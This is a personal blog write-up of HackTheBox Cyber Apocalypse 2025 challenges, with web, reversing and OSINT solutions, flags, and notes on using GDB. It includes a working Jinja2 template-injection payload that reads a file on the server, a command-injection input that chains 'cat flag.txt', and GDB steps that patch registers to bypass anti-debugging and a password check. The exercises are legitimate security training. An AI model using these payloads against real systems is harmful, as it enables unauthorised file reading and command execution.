---
title: "HTB Cyber Apocalypse 2025 Writeup: Web, Reversing and OSINT"
date: 2025-03-20
draft: false
description: "HackTheBox Cyber Apocalypse 2025 writeup: the Trial by Fire and Whispers of the Moonbeam web challenges, SealedRune and EncryptedScroll reversing, Echoes in Stone OSINT, plus notes on driving GDB."
tags: ["CTF", "Web", "Reverse Engineering", "OSINT", "GDB", "HackTheBox"]
toc: false
---


> Only participated partially on Friday 21.

{{< figure
    src="/images/ctfs/cyber-apocalypse/cert.webp"
    alt="Description of the image"
>}}

## Web

### Trial by Fire

```HTTP
POST /begin HTTP/1.1
Host: 94.237.63.32:39173

warrior_name={{get_flashed_messages.__globals__.__builtins__.open("/challange/flag.txt").read()}}
```

`HTB{Fl4m3_P34ks_Tr14l_Burn5_Br1ght_0add34e4d584b80183e824730c679e75}`

### Whispers of the Moonbeam

```bash
> observe; cat flag.txt
🥃 A grizzled warrior sips from his tankard, his eyes weary with unseen battles.

PID   USER     TIME  COMMAND
    1 root      0:00 {supervisord} /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisord.conf
    7 root      0:00 node /opt/yarn-v1.22.22/bin/yarn.js dev:backend
    8 root      0:00 node /opt/yarn-v1.22.22/bin/yarn.js dev:frontend
    9 root      0:00 nginx: master process nginx -g daemon off;
   40 nginx     0:00 nginx: worker process
   51 root      0:00 /usr/local/bin/node server/index.js
   58 root      0:04 /usr/local/bin/node /app/node_modules/.bin/vite
   73 root      0:02 /app/node_modules/@esbuild/linux-x64/bin/esbuild --service=0.21.5 --ping
   95 root      0:00 /bin/sh -c ps aux ; cat flag.txt
   96 root      0:00 ps aux

HTB{Sh4d0w_3x3cut10n_1n_Th3_M00nb34m_T4v3rn_1115e16780cdbb3bd2a32ea21b1a5374}
```

## Reverse
> I did not do a lot of reversing beside using ghidra before, so it was the perfect situation to get started with gdb. In addition I checked the source code via ghidra first, and after used GDB to set breakpoints and navigate trough the code to trigger the correct functions.

### SealedRune

```SH
gef➤  disas anti_debug
Dump of assembler code for function anti_debug:
   0x00005555555551d9 <+0>:     push   rbp
   0x00005555555551da <+1>:     mov    rbp,rsp
   0x00005555555551dd <+4>:     mov    ecx,0x0
   0x00005555555551e2 <+9>:     mov    edx,0x1
   0x00005555555551e7 <+14>:    mov    esi,0x0
   0x00005555555551ec <+19>:    mov    edi,0x0
   0x00005555555551f1 <+24>:	mov    eax,0x0
   0x00005555555551f6 <+29>:	call   0x5555555550b0 <ptrace@plt>
=> 0x00005555555551fb <+34>:	cmp    rax,0xffffffffffffffff
   0x00005555555551ff <+38>:	jne    0x55555555521a <anti_debug+65>
   0x0000555555555201 <+40>:	lea    rax,[rip+0xe00]        # 0x555555556008
   0x0000555555555208 <+47>:	mov    rdi,rax
   0x000055555555520b <+50>:	call   0x555555555040 <puts@plt>
   0x0000555555555210 <+55>:	mov    edi,0x1
   0x0000555555555215 <+60>:	call   0x5555555550d0 <exit@plt>
   0x000055555555521a <+65>:	nop
   0x000055555555521b <+66>:	pop    rbp
   0x000055555555521c <+67>:	ret

gef➤  set $rax=0
gef➤  continue
gef➤  disas check_input
Dump of assembler code for function check_input:
   0x0000555555555487 <+0>:     push   rbp
   0x0000555555555488 <+1>:     mov    rbp,rsp
   0x000055555555548b <+4>:     sub    rsp,0x20
   0x000055555555548f <+8>:     mov    QWORD PTR [rbp-0x18],rdi
   0x0000555555555493 <+12>:	mov    eax,0x0
   0x0000555555555498 <+17>:	call   0x55555555542d <decode_secret>
   0x000055555555549d <+22>:	mov    QWORD PTR [rbp-0x8],rax
   0x00005555555554a1 <+26>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x00005555555554a5 <+30>:	mov    rax,QWORD PTR [rbp-0x18]
   0x00005555555554a9 <+34>:	mov    rsi,rdx
   0x00005555555554ac <+37>:	mov    rdi,rax
   0x00005555555554af <+40>:	call   0x5555555550a0 <strcmp@plt>
=> 0x00005555555554b4 <+45>:	test   eax,eax

gef➤  set $eax=0
gef➤  continue

The secret spell is `HTB{run3_m4g1c_r3v34l3d}`.
```

### EncryptedScroll

```c
void decrypt_message(char *param_1) {
...
iVar1 = strcmp(input, flag);
if (iVar1 == 0) {
 puts("The Dragon\'s Heart is hidden beneath the Eternal Flame in Eldoria.");
}
...
```

```SH
gef➤  disas decrypt_message
Dump of assembler code for function decrypt_message:
   ...
   0x0000555555555313 <+132>:	jne    0x5555555552eb <decrypt_message+92>
   0x0000555555555315 <+134>:	lea    rdx,[rbp-0x30]
   0x0000555555555319 <+138>:	mov    rax,QWORD PTR [rbp-0x48]
   0x000055555555531d <+142>:	mov    rsi,rdx
   0x0000555555555320 <+145>:	mov    rdi,rax
=> 0x0000555555555323 <+148>:	call   0x555555555070 <strcmp@plt>
```

```SH
0x00007fffffffe290│+0x0000: 0x00007fffffffe2d0  →  0x00007fffffffe458  →  0x00007fffffffe7b7  →  "/home/majix/Downloads/rev_encryptedscroll/challeng[...]"	 ← $rsp
0x00007fffffffe298│+0x0008: 0x00007fffffffe2f0  →  0x0000000000666473 ("sdf"?)
0x00007fffffffe2a0│+0x0010: 0x0000000004800000
0x00007fffffffe2a8│+0x0018: 0x0000001bffffe458
0x00007fffffffe2b0│+0x0020: "HTB{s1mpl3_fl4g_4r1thm3t1c}"	 ← $rdx, $rsi
0x00007fffffffe2b8│+0x0028: "l3_fl4g_4r1thm3t1c}"
0x00007fffffffe2c0│+0x0030: "4r1thm3t1c}"
0x00007fffffffe2c8│+0x0038: 0x00007fff007d6331 ("1c}"?)
```


## OSINT

### Echoes in Stone
`HTB{Muiredach_High_Cross}`

## GDB learnings
- We can use `disas <func>` to get the assambler code for that function

```SH
gef➤  disas anti_debug
Dump of assembler code for function anti_debug:
   0x00000000000011d9 <+0>:	push   rbp
   0x00000000000011da <+1>:	mov    rbp,rsp
   ...
End of assembler dump.
```

- Set breakpoints via `b <func>`
- We can create little scripts that automate stuff but did not work well

```SH
gef➤  commands
>tbreak *0x11fb # Temp breakpoint
>set $rax = 0 # Modify register
>continue
>end
```

- Find functions defined in the programm `info functions -q`
- To find the main function of a library we have to find `entry` or `start`

```SH
void processEntry entry(undefined8 param_1,undefined8 param_2
```
- We can use `objdump` to find symbols of a shared library

```sh
$ objdump -T challenge

challenge:     file format elf64-x86-64

DYNAMIC SYMBOL TABLE:
0000000000000000      DF *UND*	0000000000000000 (GLIBC_2.34) __libc_start_main
0000000000000000  w   D  *UND*	0000000000000000  Base        _ITM_deregisterTMCloneTable
0000000000000000      DF *UND*	0000000000000000 (GLIBC_2.2.5) puts
0000000000000000      DF *UND*	0000000000000000 (GLIBC_2.2.5) mmap
0000000000000000      DF *UND*	0000000000000000 (GLIBC_2.2.5) srand
0000000000000000  w   D  *UND*	0000000000000000  Base        __gmon_start__
0000000000000000  w   D  *UND*	0000000000000000  Base        _ITM_registerTMCloneTable
0000000000000000  w   DF *UND*	0000000000000000 (GLIBC_2.2.5) __cxa_finalize
0000000000000000      DF *UND*	0000000000000000 (GLIBC_2.2.5) rand
```

```SH
readelf -Ws challenge | awk '{print $8}' | c++filt

Name

__libc_start_main@GLIBC_2.34
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
mmap@GLIBC_2.2.5
srand@GLIBC_2.2.5
__gmon_start__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
rand@GLIBC_2.2.5
```

- We can start the programm without any breakpoints via `start`
- We can let the programm run and once promted e.g "What is the flag?" we can hit `CTR+C` and gdb will break there
- We can then grep for strings

```
gef➤  grep "What is the flag"
[+] Searching 'What is the flag' in memory
[+] In '[stack]'(0x7ffffffdd000-0x7ffffffff000), permission=rw-
  0x7fffffffd7f8 - 0x7fffffffd80a  →   "What is the flag? "
```

- We can watch this address `watch *0x7fffffffd7f8`
- We can backtrace

```
gef➤  backtrace
#0  0x00007ffff7e0aaae in __GI__IO_puts (str=0x555555556060 "The mysteries of the universe remain closed to you...") at ioputs.c:35
...
```